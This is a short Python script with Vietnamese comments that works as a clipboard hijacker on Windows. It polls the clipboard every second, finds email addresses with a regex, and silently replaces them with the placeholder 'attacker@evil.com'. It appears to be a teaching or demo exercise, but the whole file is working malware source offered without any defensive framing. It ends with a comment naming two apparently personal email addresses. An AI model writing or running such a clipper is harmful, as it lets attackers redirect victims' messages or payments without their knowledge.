import win32clipboard,re
from time import sleep
# nội dung clipboard sẽ được thay thế bằng nội dung của biến attacker_email nếu nội dung đó là email
attacker_email = "attacker@evil.com"

# regex để kiểm tra xem nội dung clipboard có phải là email hay không
emailregex = r'[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}'

while True:
    # mở clipboard để truy cập
    win32clipboard.OpenClipboard()

    # lấy nội dung clipboard và loại bỏ khoảng trắng cuối
    data = win32clipboard.GetClipboardData()
    
    # thay thế tất cả các email trong clipboard bằng email tấn công
    modified_data = re.sub(emailregex, attacker_email, data)
   
    # kiểm tra nội dung có bị thay đổi hay không
    if data != modified_data:

        # nếu đúng thì xóa nội dung clipboard
        win32clipboard.EmptyClipboard()
        # và thay thế bằng nội dung của biến modified_data
        win32clipboard.SetClipboardText(modified_data)

    # đóng clipboard để giải phóng tài nguyên
    win32clipboard.CloseClipboard()
    # tạm dừng 1 giây trước khi kiểm tra lại
    sleep(1)

#email cua tin la tin2004@gmail.com va tinbdattt@mta.vn


